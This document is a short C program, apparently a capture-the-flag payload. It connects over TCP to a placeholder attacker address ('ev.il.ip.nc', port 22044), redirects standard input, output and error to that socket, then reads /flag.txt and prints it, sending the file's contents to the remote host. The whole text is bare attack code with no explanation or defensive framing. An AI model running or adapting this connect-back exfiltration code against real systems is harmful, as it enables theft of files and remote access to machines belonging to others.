#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>


int main(void)
{
  int i;
  int sockfd;
  socklen_t socklen;

  struct sockaddr_in srv_addr;

  srv_addr.sin_family = AF_INET;
  srv_addr.sin_port = htons( 22044 );
  srv_addr.sin_addr.s_addr = inet_addr("ev.il.ip.nc");

  sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
  connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

  for(i = 0; i <= 2; i++)
  dup2(sockfd, i);

  char str[64];
  FILE * file;
  file = fopen( "/flag.txt" , "r");
  if (file) {
    while (fscanf(file, "%s", str)!=EOF)
      printf("%s\n",str);
    fclose(file);
  }
}
.
